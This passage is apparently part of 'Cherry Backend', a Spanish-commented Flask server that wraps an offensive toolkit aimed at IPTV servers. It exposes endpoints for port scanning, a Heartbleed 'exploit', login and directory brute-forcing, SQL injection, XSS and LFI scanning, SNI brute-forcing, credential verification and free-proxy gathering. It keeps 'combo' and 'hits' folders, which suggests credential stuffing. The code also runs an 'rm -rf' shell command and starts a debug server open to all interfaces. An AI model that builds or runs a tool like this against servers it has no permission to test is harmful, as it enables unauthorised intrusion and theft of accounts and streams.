    port_list = []
    if ports_str:
        for p in ports_str.split(','):
            try:
                port_list.append(int(p.strip()))
            except:
                pass
        if len(port_list) > 30:
            port_list = port_list[:30]
    else:
        port_list = IPTV_PORTS[:30]
    
    # Iniciar logger
    logger = set_current_logger(host)
    logger.write('scan', f"Iniciando escaneo de {host} con {len(port_list)} puertos")
    
    results = []
    batch_size = 5
    for i in range(0, len(port_list), batch_size):
        batch = port_list[i:i+batch_size]
        with ThreadPoolExecutor(max_workers=min(MAX_WORKERS, len(batch))) as executor:
            futures = {executor.submit(scan_port, host, p): p for p in batch}
            for future in futures:
                try:
                    result = future.result(timeout=TIMEOUT+2)
                    results.append(result)
                    if result.get('open'):
                        logger.write('scan', f"Puerto {result['port']} abierto - {result['service']}")
                except:
                    results.append({'port': futures[future], 'open': False})
    
    open_ports = [r for r in results if r.get('open')]
    vulnerable = [r for r in results if r.get('vulnerable')]
    location = get_ip_location(host)
    
    logger.write('scan', f"Escaneo completado. {len(open_ports)} abiertos, {len(vulnerable)} vulnerables")
    logger.close_all()
    
    return jsonify({
        'host': host,
        'location': location,
        'results': results,
        'open_ports': open_ports,
        'vulnerable_ports': vulnerable,
        'open': len(open_ports),
        'vulnerable': len(vulnerable),
        'total': len(results),
        'timestamp': datetime.now().isoformat()
    })

@app.route('/api/deep-analyze', methods=['POST'])
def deep_analyze():
    data = request.json
    host = data.get('host')
    port = data.get('port')
    
    if not host or not port:
        return jsonify({'error': 'Host y puerto requeridos'}), 400
    
    result = scan_port(host, int(port))
    
    return jsonify({
        'success': True,
        'results': result
    })

@app.route('/api/scan-quick', methods=['POST'])
def scan_quick():
    data = request.json
    host = data.get('host', '').strip()
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    host = host.replace('http://', '').replace('https://', '').split('/')[0].split(':')[0]
    critical_ports = [80, 443, 8080, 8443, 8888, 25461, 25462, 25463, 8081]
    
    results = []
    with ThreadPoolExecutor(max_workers=5) as executor:
        futures = {executor.submit(scan_port, host, p): p for p in critical_ports}
        for future in futures:
            try:
                result = future.result(timeout=3)
                results.append(result)
            except:
                pass
    
    return jsonify({
        'host': host,
        'results': results,
        'open_ports': [r for r in results if r.get('open')]
    })

@app.route('/api/exploit/heartbleed', methods=['POST'])
def exploit_heartbleed():
    data = request.json
    host = data.get('host')
    port = data.get('port', 443)
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    result = check_heartbleed(host, int(port))
    return jsonify(result)

@app.route('/api/m3u/process', methods=['POST'])
def m3u_process():
    data = request.json
    url = data.get('url')
    
    if not url:
        return jsonify({'error': 'URL requerida'}), 400
    
    result = extract_from_m3u(url)
    return jsonify(result)

@app.route('/api/sni-test', methods=['POST'])
def sni_test():
    data = request.json
    host = data.get('host')
    port = data.get('port', 443)
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    result = sni_bruteforce(host, int(port))
    return jsonify({'success': True, 'results': result})

@app.route('/api/verify', methods=['POST'])
def verify():
    data = request.json
    host = data.get('host')
    username = data.get('username')
    password = data.get('password')
    port = data.get('port', 80)
    
    if not host or not username or not password:
        return jsonify({'error': 'Host, usuario y contraseña requeridos'}), 400
    
    result = verify_credentials(host, int(port), username, password)
    return jsonify(result)

@app.route('/api/m3u/server', methods=['POST'])
def m3u_server():
    data = request.json
    url = data.get('url')
    
    if not url:
        return jsonify({'error': 'URL requerida'}), 400
    
    result = extract_from_m3u(url)
    return jsonify(result)

@app.route('/api/mirrors', methods=['GET'])
def mirrors():
    host = request.args.get('host')
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    result = find_mirrors(host)
    return jsonify(result)

@app.route('/api/bruteforce/directories', methods=['POST'])
def bruteforce_directories():
    data = request.json
    host = data.get('host')
    port = data.get('port', 80)
    ssl = data.get('ssl', False)
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    results = brute_force_directories(host, int(port), ssl)
    return jsonify({'success': True, 'results': results, 'count': len(results)})

@app.route('/api/bruteforce/login', methods=['POST'])
def bruteforce_login():
    data = request.json
    host = data.get('host')
    port = data.get('port', 80)
    ssl = data.get('ssl', False)
    login_path = data.get('login_path', '/login.php')
    username_field = data.get('username_field', 'username')
    password_field = data.get('password_field', 'password')
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    results = brute_force_login(host, int(port), ssl, login_path, username_field, password_field)
    return jsonify({'success': True, 'results': results, 'count': len(results)})

@app.route('/api/scanner/sqli', methods=['POST'])
def scan_sqli():
    data = request.json
    host = data.get('host')
    port = data.get('port', 80)
    ssl = data.get('ssl', False)
    path = data.get('path', '/')
    param = data.get('param', 'id')
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    results = scan_sql_injection(host, int(port), ssl, path, param)
    return jsonify({'success': True, 'results': results, 'count': len(results)})

@app.route('/api/scanner/xss', methods=['POST'])
def scan_xss_route():
    data = request.json
    host = data.get('host')
    port = data.get('port', 80)
    ssl = data.get('ssl', False)
    path = data.get('path', '/')
    param = data.get('param', 'q')
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    results = scan_xss(host, int(port), ssl, path, param)
    return jsonify({'success': True, 'results': results, 'count': len(results)})

@app.route('/api/scanner/lfi', methods=['POST'])
def scan_lfi_route():
    data = request.json
    host = data.get('host')
    port = data.get('port', 80)
    ssl = data.get('ssl', False)
    path = data.get('path', '/')
    param = data.get('param', 'file')
    
    if not host:
        return jsonify({'error': 'Host requerido'}), 400
    
    results = scan_lfi(host, int(port), ssl, path, param)
    return jsonify({'success': True, 'results': results, 'count': len(results)})

@app.route('/api/dns/scan', methods=['POST'])
def dns_scan_route():
    data = request.json
    domains = data.get('domains', [])
    
    if not domains:
        return jsonify({'error': 'Lista de dominios requerida'}), 400
    
    results = dns_scan(domains)
    return jsonify({'success': True, 'results': results, 'count': len(results)})

@app.route('/api/subdomains/scan', methods=['POST'])
def subdomains_scan():
    data = request.json
    domain = data.get('domain')
    
    if not domain:
        return jsonify({'error': 'Dominio requerido'}), 400
    
    results = subdomain_scan(domain)
    return jsonify({'success': True, 'results': results, 'count': len(results)})

@app.route('/api/proxies', methods=['GET'])
def get_proxies():
    proxy_type = request.args.get('type', 'all')
    proxies = get_free_proxies(proxy_type)
    return jsonify({
        'proxies': proxies,
        'socks_available': SOCKS_AVAILABLE,
        'message': 'SOCKS disponible' if SOCKS_AVAILABLE else 'SOCKS no disponible (instalar pysocks)'
    })

@app.route('/api/interceptor/stats', methods=['GET'])
def interceptor_stats():
    return jsonify(network_interceptor.get_stats())

@app.route('/api/clear', methods=['POST'])
def clear():
    try:
        os.system(f"rm -rf {BASE_DIR}/*")
        os.makedirs(f"{BASE_DIR}/logs", exist_ok=True)
        os.makedirs(f"{BASE_DIR}/complete", exist_ok=True)
        os.makedirs(f"{BASE_DIR}/hits", exist_ok=True)
        os.makedirs(f"{BASE_DIR}/combo", exist_ok=True)
        return jsonify({'success': True, 'message': 'Cache cleared'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

if __name__ == '__main__':
    print("\n" + "="*80)
    print("🍒 CHERRY BACKEND - ULTIMATE COMPLETE EDITION 🍒")
    print("="*80)
    print(f"📋 Puertos configurados: {len(IPTV_PORTS)}")
    print(f"🔧 Heartbleed: ACTIVADO")
    print(f"📁 M3U Processing: ACTIVADO")
    print(f"🔍 SNI Brute-force: ACTIVADO")
    print(f"🎯 Mirrors: ACTIVADO")
    print(f"📂 Directory Bruteforce: ACTIVADO")
    print(f"🔐 Login Bruteforce: ACTIVADO")
    print(f"💉 SQL Injection Scanner: ACTIVADO")
    print(f"🖥️ XSS Scanner: ACTIVADO")
    print(f"📁 LFI Scanner: ACTIVADO")
    print(f"🌐 DNS Scan: ACTIVADO")
    print(f"🕸️ Subdomain Scan: ACTIVADO")
    print(f"🛡️ SOCKS Proxy: {'ACTIVADO' if SOCKS_AVAILABLE else 'NO DISPONIBLE (pip install pysocks)'}")
    print(f"📡 Network Interceptor: ACTIVADO")
    print(f"📝 Logging System: ACTIVADO")
    print(f"📂 Datos en: {BASE_DIR}")
    print("="*80 + "\n")
    app.run(host='0.0.0.0', port=5000, debug=True, threaded=True)